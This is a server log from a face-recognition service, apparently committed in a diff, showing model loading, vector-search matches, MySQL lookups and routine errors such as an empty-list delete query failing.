+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:63241 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:00:22.939 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 291.567138671875, id: 437359909826986407)']"]
+2022-11-15 08:00:22.940 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[200.44943   114.29312   534.8633    413.5315      0.6463824]]
+('6284680ef6f4201104b3af75', 'static/40bf898c609a11ed84aaad0224ec19ed_6284680ef6f4201104b3af75_masked.jpg')
+path:  ['static/40bf898c609a11ed84aaad0224ec19ed_6284680ef6f4201104b3af75_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986407']
+time:  0.14014744758605957
+INFO:     123.24.206.26:36485 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:06:51.017 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 223.87646484375, id: 437359909826985994)']"]
+2022-11-15 08:06:51.017 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[203.20544   157.27849   510.88058   483.87384     0.8541725]]
+('620620bfac8a2337377a0a07', 'static/96e8a0b85e8911ed8a8bb108c0801c44_620620bfac8a2337377a0a07.jpg')
+path:  ['static/96e8a0b85e8911ed8a8bb108c0801c44_620620bfac8a2337377a0a07.jpg']
+pr>>>>>>>>>>> ['437359909826985994']
+time:  0.24211907386779785
+INFO:     123.24.206.26:62067 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:13:23.962 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 247.6278076171875, id: 437359909826986386)']"]
+2022-11-15 08:13:23.962 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[142.11656    187.87665    422.4869     443.329        0.78199804]]
+('626a1ca315e49f66d33d5c9f', 'static/263c7e26609a11ed84aaad0224ec19ed_626a1ca315e49f66d33d5c9f.jpg')
+path:  ['static/263c7e26609a11ed84aaad0224ec19ed_626a1ca315e49f66d33d5c9f.jpg']
+pr>>>>>>>>>>> ['437359909826986386']
+time:  0.17238473892211914
+INFO:     123.24.206.26:54680 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:13:42.155 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 800.9700927734375, id: 437359909826986288)']"]
+2022-11-15 08:13:42.156 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[110.80542   117.49982   452.67014   476.9519      0.7302611]]
+('6332af439cc75161026cb5d6', 'static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6.jpg')
+path:  ['static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6.jpg']
+pr>>>>>>>>>>> ['437359909826986288']
+time:  0.25232768058776855
+INFO:     123.24.206.26:47331 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:13:50.023 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 767.7681884765625, id: 437359909826986295)']"]
+2022-11-15 08:13:50.024 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[106.38269    119.32573    471.62457    481.3949       0.64959466]]
+('6332af439cc75161026cb5d6', 'static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6_masked.jpg')
+path:  ['static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986295']
+time:  0.1962449550628662
+INFO:     123.24.206.26:65097 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:14:18.929 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 145.946044921875, id: 437359909826986148)']"]
+2022-11-15 08:14:18.930 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[178.45615   189.4352    442.85556   487.3438      0.8469459]]
+('61c6c1e18d4c8e02a8d839b4', 'static/09652a705f0311ed8a8bb108c0801c44_61c6c1e18d4c8e02a8d839b4.jpg')
+path:  ['static/09652a705f0311ed8a8bb108c0801c44_61c6c1e18d4c8e02a8d839b4.jpg']
+pr>>>>>>>>>>> ['437359909826986148']
+time:  0.2220144271850586
+INFO:     123.24.206.26:44976 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:17:29.989 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:58997 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:17:33.126 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:52176 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:17:36.434 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:48438 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:17:39.598 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 265.8982849121094, id: 437359909826986491)']"]
+2022-11-15 08:17:39.599 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[212.88962   161.06314   492.56488   330.8527      0.6228558]]
+('6284680ff6f4201104b3af79', 'static/e6aa46aa616411ed84aaad0224ec19ed_6284680ff6f4201104b3af79_masked.jpg')
+path:  ['static/e6aa46aa616411ed84aaad0224ec19ed_6284680ff6f4201104b3af79_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986491']
+time:  0.15808916091918945
+INFO:     123.24.206.26:50215 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:17:58.642 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 578.3095092773438, id: 437359909826986554)']"]
+2022-11-15 08:17:58.642 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[149.52278    87.17404   425.57788   362.85907     0.6457634]]
+('62fc73d3422ac27d7b64a805', 'static/8896ff82622611edaede09a65ce7aeeb_62fc73d3422ac27d7b64a805.jpg')
+path:  ['static/8896ff82622611edaede09a65ce7aeeb_62fc73d3422ac27d7b64a805.jpg']
+pr>>>>>>>>>>> ['437359909826986554']
+time:  0.2001171112060547
+INFO:     123.24.206.26:63809 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:18:07.406 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 351.31707763671875, id: 437359909826986554)']"]
+2022-11-15 08:18:07.406 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[168.88217    91.851685  428.6887    326.3484      0.7943387]]
+('62fc73d3422ac27d7b64a805', 'static/8896ff82622611edaede09a65ce7aeeb_62fc73d3422ac27d7b64a805.jpg')
+path:  ['static/8896ff82622611edaede09a65ce7aeeb_62fc73d3422ac27d7b64a805.jpg']
+pr>>>>>>>>>>> ['437359909826986554']
+time:  0.16686749458312988
+INFO:     123.24.206.26:39685 - "POST /recognize HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+2022-11-15 08:21:55.455 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:57128 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:22:21.576 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 453.9676513671875, id: 437359909826986134)']"]
+2022-11-15 08:22:21.576 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[168.29695    127.43335    550.8844     453.61267      0.60113484]]
+('626a1ca115e49f66d33d5c8f', 'static/b9eb032a5f0211ed8a8bb108c0801c44_626a1ca115e49f66d33d5c8f.jpg')
+path:  ['static/b9eb032a5f0211ed8a8bb108c0801c44_626a1ca115e49f66d33d5c8f.jpg']
+pr>>>>>>>>>>> ['437359909826986134']
+time:  0.25106000900268555
+INFO:     123.24.206.26:55878 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:22:31.500 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:56554 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:22:44.852 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 263.37750244140625, id: 437359909826986120)']"]
+2022-11-15 08:22:44.852 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[231.81134   157.05476   485.0734    420.48654     0.8890827]]
+('61c6c1118d4c8e02a8d838d1', 'static/94a2e9b65f0211ed8a8bb108c0801c44_61c6c1118d4c8e02a8d838d1.jpg')
+path:  ['static/94a2e9b65f0211ed8a8bb108c0801c44_61c6c1118d4c8e02a8d838d1.jpg']
+pr>>>>>>>>>>> ['437359909826986120']
+time:  0.2129380702972412
+INFO:     123.24.206.26:57574 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:22:52.161 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:52526 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:23:15.813 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 311.2052307128906, id: 437359909826986211)']"]
+2022-11-15 08:23:15.813 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[185.17516   136.32623   451.58524   406.50067     0.8278569]]
+('626a1ca215e49f66d33d5c97', 'static/6c6d077e5fca11ed8a8bb108c0801c44_626a1ca215e49f66d33d5c97_masked.jpg')
+path:  ['static/6c6d077e5fca11ed8a8bb108c0801c44_626a1ca215e49f66d33d5c97_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986211']
+time:  0.21090245246887207
+INFO:     123.24.206.26:43198 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:23:16.788 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 169.62420654296875, id: 437359909826986253)']"]
+2022-11-15 08:23:16.789 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[230.94527   161.7927    480.86038   432.5426      0.8879573]]
+('633554ad713bea0e8df560fc', 'static/27e44ecc5fcb11ed8a8bb108c0801c44_633554ad713bea0e8df560fc_masked.jpg')
+path:  ['static/27e44ecc5fcb11ed8a8bb108c0801c44_633554ad713bea0e8df560fc_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986253']
+time:  0.2640950679779053
+INFO:     123.24.206.26:59936 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:23:18.549 | ERROR    | module.mysql_helpers:show_image:95 - Mysql error: tuple index out of range with sql: select image_path from _2090App where person_id = %s ;
+INFO:     123.24.206.26:50747 - "POST /showimage HTTP/1.1" 200 OK
+2022-11-15 08:23:23.713 | DEBUG    | module.mysql_helpers:search_data_by_person_id:80 - MYSQL search by person_id: ['633274d59cc75161026baec2']
+2022-11-15 08:23:23.715 | ERROR    | module.mysql_helpers:delete:143 - MYSQL ERROR: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')' at line 1") with sql: delete from _2090App where milvus_id in ();
+2022-11-15 08:23:23.716 | INFO     | __main__:delete:385 - Successfully delete entity in Milvus and MySQL!
+INFO:     123.24.206.26:41925 - "POST /delete HTTP/1.1" 200 OK
+2022-11-15 08:23:49.380 | ERROR    | __main__:search:301 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+INFO:     123.24.206.26:37677 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     123.24.206.26:37636 - "POST /showimage HTTP/1.1" 422 Unprocessable Entity
+2022-11-15 08:24:12.639 | DEBUG    | module.mysql_helpers:search_data_by_person_id:80 - MYSQL search by person_id: ['626a1cdb15e49f66d33d5cb5']
+2022-11-15 08:24:12.649 | DEBUG    | module.mysql_helpers:delete:141 - MYSQL delete id:['437359909826986302', '437359909826986309'] in table:_2090App
+2022-11-15 08:24:12.650 | INFO     | __main__:delete:385 - Successfully delete entity in Milvus and MySQL!
+INFO:     123.24.206.26:38857 - "POST /delete HTTP/1.1" 200 OK
+2022-11-15 08:24:41.747 | ERROR    | __main__:insert:195 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Total:  0.24257469177246094
+INFO:     123.24.206.26:62529 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:24:54.003 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 314.4358825683594, id: 437359909826986288)']"]
+2022-11-15 08:24:54.004 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[170.2103     120.8408     463.094      341.7691       0.73382795]]
+('6332af439cc75161026cb5d6', 'static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6.jpg')
+path:  ['static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6.jpg']
+pr>>>>>>>>>>> ['437359909826986288']
+time:  0.23054957389831543
+INFO:     123.24.206.26:51601 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:25:02.147 | ERROR    | __main__:insert:195 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Total:  0.22768926620483398
+INFO:     123.24.206.26:55399 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:25:06.840 | DEBUG    | module.mysql_helpers:search_data_by_person_id:80 - MYSQL search by person_id: ['626a1cdb15e49f66d33d5cb5']
+2022-11-15 08:25:06.842 | ERROR    | module.mysql_helpers:delete:143 - MYSQL ERROR: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')' at line 1") with sql: delete from _2090App where milvus_id in ();
+2022-11-15 08:25:06.843 | INFO     | __main__:delete:385 - Successfully delete entity in Milvus and MySQL!
+INFO:     123.24.206.26:41016 - "POST /delete HTTP/1.1" 200 OK
+INFO:     123.24.206.26:50125 - "POST /showimage HTTP/1.1" 422 Unprocessable Entity
+2022-11-15 08:25:23.651 | ERROR    | __main__:insert:195 - Can't rotate image face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Total:  0.22748088836669922
+INFO:     123.24.206.26:34292 - "POST /insert HTTP/1.1" 200 OK
+2022-11-15 08:25:26.531 | DEBUG    | module.mysql_helpers:search_data_by_person_id:80 - MYSQL search by person_id: ['626a1cdb15e49f66d33d5cb5']
+2022-11-15 08:25:26.531 | ERROR    | module.mysql_helpers:delete:143 - MYSQL ERROR: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')' at line 1") with sql: delete from _2090App where milvus_id in ();
+2022-11-15 08:25:26.531 | INFO     | __main__:delete:385 - Successfully delete entity in Milvus and MySQL!
+INFO:     123.24.206.26:62932 - "POST /delete HTTP/1.1" 200 OK
+2022-11-15 08:25:27.250 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 524.7215576171875, id: 437359909826986295)']"]
+2022-11-15 08:25:27.251 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[234.76733   101.29501   517.1233    388.7823      0.8460593]]
+('6332af439cc75161026cb5d6', 'static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6_masked.jpg')
+path:  ['static/71a6dbe25fcb11ed8a8bb108c0801c44_6332af439cc75161026cb5d6_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986295']
+time:  0.2280874252319336
+INFO:     123.24.206.26:57085 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 08:25:40.522 | ERROR    | module.mysql_helpers:show_image:95 - Mysql error: tuple index out of range with sql: select image_path from _2090App where person_id = %s ;
+INFO:     123.24.206.26:42695 - "POST /showimage HTTP/1.1" 200 OK
+2022-11-15 08:25:43.572 | ERROR    | module.mysql_helpers:show_image:95 - Mysql error: tuple index out of range with sql: select image_path from _2090App where person_id = %s ;
+INFO:     123.24.206.26:45626 - "POST /showimage HTTP/1.1" 200 OK
+INFO:     123.24.206.26:47785 - "POST /insert HTTP/1.1" 422 Unprocessable Entity
+/home/ai-r-d/anaconda3/envs/client/lib/python3.10/site-packages/insightface/utils/transform.py:68: FutureWarning: `rcond` parameter will change to the default of machine precision times ``max(M, N)`` where M and N are the input matrix dimensions.
+To use the future default and silence this warning we advise to pass `rcond=None`, to keep using the old, explicitly pass `rcond=-1`.
+  P = np.linalg.lstsq(X_homo, Y)[0].T # Affine matrix. 3 x 4
+2022-11-15 08:25:48.886 | ERROR    | __main__:insert:277 - Fake face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+no rotate
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/6e42b670648411ed9b774ba7bb94539d_626a1cdb15e49f66d33d5cb5.jpg
+Total:  2.4816439151763916
+INFO:     123.24.206.26:34059 - "POST /insert HTTP/1.1" 200 OK
+INFO:     123.24.206.26:38514 - "POST /delete HTTP/1.1" 422 Unprocessable Entity
